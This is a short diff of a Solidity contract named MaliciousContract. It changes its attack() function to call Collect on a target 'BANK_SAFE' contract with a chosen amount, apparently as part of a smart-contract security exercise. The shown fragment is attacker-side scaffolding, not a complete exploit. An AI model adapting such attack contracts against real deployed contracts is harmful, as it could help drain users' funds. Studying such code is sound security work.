@@ -12,9 +12,9 @@ contract MaliciousContract{
         bank_SAFE= BANK_SAFE (_bank_SAFE);
     }
 
-    function attack() public payable{
-        require(msg.value >= 1 ether, "Must send at least 1 ether");
-        bank_SAFE.Collect(msg.value);
+    function attack(uint amount) public {
+        require(amount >= 1 ether, "Must attempt and attack with at least 1 ether");
+       bank_SAFE.Collect(amount);
     }
 
     function deposit()  public payable{
